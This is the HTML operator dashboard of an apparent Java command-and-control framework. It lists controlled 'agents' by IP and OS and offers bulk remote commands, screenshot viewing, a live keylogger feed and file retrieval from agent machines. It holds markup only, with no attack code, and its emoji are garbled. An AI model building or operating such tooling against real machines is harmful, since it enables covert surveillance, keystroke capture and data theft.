<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Java C2 Framework</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- Bootstrap 5 CDN -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom CSS -->
    <link rel="stylesheet" href="style.css">
</head>
<body class="bg-dark text-light">
<!-- Screenshot Preview Modal -->
<div class="modal fade" id="screenshotModal" tabindex="-1" aria-hidden="true">
    <div class="modal-dialog modal-xl modal-dialog-centered">
        <div class="modal-content bg-dark text-light border-secondary">
            <div class="modal-header">
                <h5 class="modal-title">üñºÔ∏è Screenshot Preview</h5>
                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body text-center">
                <img id="modalScreenshot" src="" class="rounded shadow" style="max-width: 100%; max-height: 85vh; object-fit: contain;">
            </div>
        </div>
    </div>
</div>

<div class="container-fluid">
    <div class="row flex-nowrap">

        <!-- Sidebar -->
        <div class="col-md-3 bg-secondary p-3 min-vh-100" id="sidebar">
            <h4 class="text-white">Agents</h4>
            <div class="mb-2 d-flex gap-2">
                <button class="btn btn-danger btn-sm flex-fill" id="bulk-delete-btn" onclick="bulkDeleteAgents()" disabled>üóëÔ∏è Delete Selected</button>
                <button class="btn btn-primary btn-sm flex-fill" id="bulk-command-btn" onclick="showBulkCommandModal()" disabled>üí¨ Send Command</button>
            </div>
            <ul class="list-group" id="agent-list">
                <!-- Agent items will be injected by JS -->
            </ul>
            <button class="btn btn-sm btn-success mt-3 w-100" onclick="loadAgents()">üîÑ Refresh Agents</button>
        </div>

        <!-- Bulk Delete Modal -->
        <div class="modal fade" id="bulkDeleteModal" tabindex="-1" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content bg-dark text-light border-secondary">
                    <div class="modal-header">
                        <h5 class="modal-title">Confirm Bulk Delete</h5>
                        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div class="modal-body">
                        <p>Are you sure you want to delete the selected agents?</p>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                        <button type="button" class="btn btn-danger" onclick="confirmBulkDelete()">Delete</button>
                    </div>
                </div>
            </div>
        </div>

        <!-- Bulk Command Modal -->
        <div class="modal fade" id="bulkCommandModal" tabindex="-1" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content bg-dark text-light border-secondary">
                    <div class="modal-header">
                        <h5 class="modal-title">Send Command to Selected Agents</h5>
                        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div class="modal-body">
                        <input type="text" class="form-control" id="bulkCommandInput" placeholder="Enter command">
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                        <button type="button" class="btn btn-primary" onclick="confirmBulkCommand()">Send</button>
                    </div>
                </div>
            </div>
        </div>

        <!-- Main Panel -->
        <div class="col-md-9 p-4">
            <div class="row mb-4" id="dashboard-summary">
                <div class="col-md-3 mb-2">
                    <div class="card bg-success text-white shadow">
                        <div class="card-body">
                            <h6 class="card-title">Total Agents</h6>
                            <h3 id="summary-total-agents">0</h3>
                        </div>
                    </div>
                </div>
                <div class="col-md-3 mb-2">
                    <div class="card bg-warning text-dark shadow">
                        <div class="card-body">
                            <h6 class="card-title">Pending Commands</h6>
                            <h3 id="summary-pending-commands">0</h3>
                        </div>
                    </div>
                </div>
                <div class="col-md-3 mb-2">
                    <div class="card bg-primary text-white shadow">
                        <div class="card-body">
                            <h6 class="card-title">Recent Screenshots</h6>
                            <h3 id="summary-recent-screenshots">0</h3>
                        </div>
                    </div>
                </div>
            </div>
            <div class="d-flex justify-content-end align-items-center mb-2">
                <button id="theme-toggle-btn" class="btn btn-outline-light" onclick="toggleTheme()" title="Toggle dark/light mode">
                    <span id="theme-icon">üåô</span>
                </button>
            </div>
            <div id="agent-details-card" class="card bg-secondary text-white mb-3" style="display:none;">
                <div class="card-body">
                    <h5 class="card-title">Agent Details</h5>
                    <p class="card-text mb-1"><strong>ID:</strong> <span id="details-agent-id"></span></p>
                    <p class="card-text mb-1"><strong>IP:</strong> <span id="details-agent-ip"></span></p>
                    <p class="card-text mb-1"><strong>OS:</strong> <span id="details-agent-os"></span></p>
                </div>
            </div>
            <h3 id="selected-agent">Select an agent to view details</h3>
            <!-- Tabs -->
            <ul class="nav nav-tabs mt-3" id="agentTabs" role="tablist">
                <li class="nav-item" role="presentation">
                    <button class="nav-link active" id="commands-tab" data-bs-toggle="tab" data-bs-target="#commands" type="button">Commands</button>
                </li>
                <li class="nav-item" role="presentation">
                    <button class="nav-link" id="results-tab" data-bs-toggle="tab" data-bs-target="#results" type="button">Results</button>
                </li>
                <li class="nav-item" role="presentation">
                    <button class="nav-link" id="screenshots-tab" data-bs-toggle="tab" data-bs-target="#screenshots" type="button">Screenshots</button>
                </li>
                <li class="nav-item" role="presentation">
                    <button class="nav-link" id="keylogger-tab" data-bs-toggle="tab" data-bs-target="#keylogger" type="button">Keylogger</button>
                </li>
                <li class="nav-item" role="presentation">
                    <button class="nav-link" id="files-tab" data-bs-toggle="tab" data-bs-target="#files" type="button">Files</button>
                </li>
            </ul>

            <!-- Tab Content -->
            <div class="tab-content mt-3">
                <div class="tab-pane fade show active" id="commands">
                    <h5>Commands for Agent: <span id="commands-agent-id"></span></h5>
                    <div class="d-flex justify-content-between align-items-center mb-2">
                        <input class="form-control w-75 me-2" placeholder="üîç Search commands..." oninput="filterCommands(this.value)">
                        <button class="btn btn-sm btn-outline-light" onclick="exportCommands()">üì§ Export</button>
                    </div>
                    <div id="lastResultBox"
                         class="bg-black text-success p-3 rounded mt-2"
                         style="white-space: pre-wrap; font-family: monospace; max-height: 300px; overflow-y: auto;"></div>
                    <div class="input-group mb-3 mt-3">
                        <input type="text" id="newCommandInput" class="form-control" placeholder="Enter command">
                        <button class="btn btn-primary" onclick="assignCommand()">Send</button>
                    </div>
                    <ul class="list-group" id="commandList"></ul>
                </div>


                <div class="tab-pane fade" id="results" role="tabpanel" aria-labelledby="results-tab">
                    <!-- Results tab content -->
                </div>
                <div class="tab-pane fade" id="screenshots" role="tabpanel" aria-labelledby="screenshots-tab">
                    <!-- Screenshot tab content -->
                </div>
                <div class="tab-pane fade" id="keylogger" role="tabpanel" aria-labelledby="keylogger-tab">
                    <div id="keylogLiveBox" class="bg-black text-success p-3 rounded" style="font-family: monospace; min-height: 120px; max-height: 320px; overflow-y: auto; white-space: pre-wrap;"></div>
                </div>
                <div class="tab-pane fade" id="files" role="tabpanel" aria-labelledby="files-tab">
                    <form id="requestFileForm" class="mb-3" onsubmit="requestFileFromAgent(event)">
                        <div class="input-group">
                            <input type="text" class="form-control" id="remoteFilePath" placeholder="Path to file on agent PC" required>
                            <button class="btn btn-warning" type="submit">Request File</button>
                        </div>
                    </form>
                    <form id="fileUploadForm" class="mb-3" onsubmit="uploadFile(event)">
                        <div class="input-group">
                            <input type="file" class="form-control" id="fileInput" required>
                            <button class="btn btn-primary" type="submit">Upload</button>
                        </div>
                    </form>
                    <ul class="list-group" id="fileList"></ul>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Bootstrap JS CDN -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<!-- SockJS and Stomp.js for WebSocket support -->
<script src="https://cdn.jsdelivr.net/npm/sockjs-client@1/dist/sockjs.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/stompjs@2.3.3/lib/stomp.min.js"></script>
<!-- Your JS -->
<script src="script.js"></script>
</body>
</html>
